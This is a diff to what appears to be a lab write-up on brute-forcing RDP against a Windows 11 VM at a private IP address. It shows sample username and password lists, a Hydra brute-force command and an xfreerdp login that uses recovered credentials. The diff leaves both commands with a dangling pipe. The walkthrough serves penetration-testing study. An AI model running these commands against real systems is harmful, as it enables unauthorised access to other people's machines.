@@ -51,18 +51,12 @@ sudo nmap -p0-65535 192.168.133.131
 To perform brute-force, we create username and password lists.
 
 **📌 Example Username List (userlist.txt):**
-txt,
-Copy,
-Edit,
 admin,
 user,
 administrator,
 wasique
 
 **📌 Example Password List (passlist.txt):**
-txt,
-Copy,
-Edit,
 123456,
 password,
 admin123,
@@ -71,14 +65,14 @@ admin123,
 We use Hydra to attempt login with the generated username/password lists.
 
 **Command Used:**
-sudo hydra -L userlist.txt -P passlist.txt rdp://192.168.133.131 2>/dev/null
+sudo hydra -L userlist.txt -P passlist.txt rdp://192.168.133.131 2>/dev/null | 
 📌 Result: Valid credentials were found!
 
 **🔹 Step 5: Connecting to Target with xfreerdp**
 Once valid credentials are obtained, we use xfreerdp to connect.
 
 **Command Used:**
-sudo xfreerdp /u:Wasique /p:01798930353 /v:192.168.133.131
+sudo xfreerdp /u:Wasique /p:01798930353 /v:192.168.133.131 | 
 📌 Result: Successfully connected to the target Windows 11 machine!
 
 **📌 Results**
